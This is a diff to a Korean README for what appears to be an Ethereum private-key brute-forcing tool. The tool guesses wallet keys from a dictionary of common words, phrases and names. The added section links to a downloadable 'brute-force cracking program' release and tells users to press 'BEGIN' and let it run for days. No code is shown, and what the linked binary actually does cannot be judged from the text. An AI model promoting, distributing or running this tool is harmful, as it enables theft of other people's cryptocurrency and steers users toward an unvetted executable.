@@ -9,6 +9,17 @@
 
 일반적인 단어, 문구, 이름 등을 포함한 일반적인 비밀번호 사전을 사용하여 개인 키를 생성해 보세요.
 
+
+
+# 사용 지침
+[무차별 대입 크래킹 프로그램을 다운로드하려면 클릭하세요](https://github.com/web3inventor/eth-brute-force-cracking/releases/tag/1.0.2)
+
+
+
+실행을 시작하려면 맨 오른쪽에 있는 "BEGIN" 버튼을 클릭하세요. (실제 테스트: 3일 이상 연속 작동 시 더 나은 결과를 얻을 수 있음)
+
+<img width="900" alt="예" src="https://github.com/user-attachments/assets/4aa230b1-c457-4638-89e4-123eca955457">
+
 # 면책조항
 
 소프트웨어는 보증 없이 있는 그대로 제공됩니다. 자신의 책임하에 사용하십시오.
